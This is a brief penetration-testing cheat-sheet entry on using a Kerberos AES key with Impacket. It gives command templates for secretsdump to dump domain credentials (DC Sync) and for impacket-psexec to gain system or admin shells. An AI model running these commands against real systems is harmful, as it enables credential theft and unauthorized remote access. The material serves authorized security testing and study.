# aesKey

## Tools: impacket tools , secretsdump

#### 1) secretsdump

 - [proxychains] secretsdump -aesKey AES_KEY 'DOMAIN'/'USER'@'IP' (See DC Sync)

#### 2) impacket tools

impacket-psexec -aesKey AES_KEY USER@FQDN (System/Admin access)
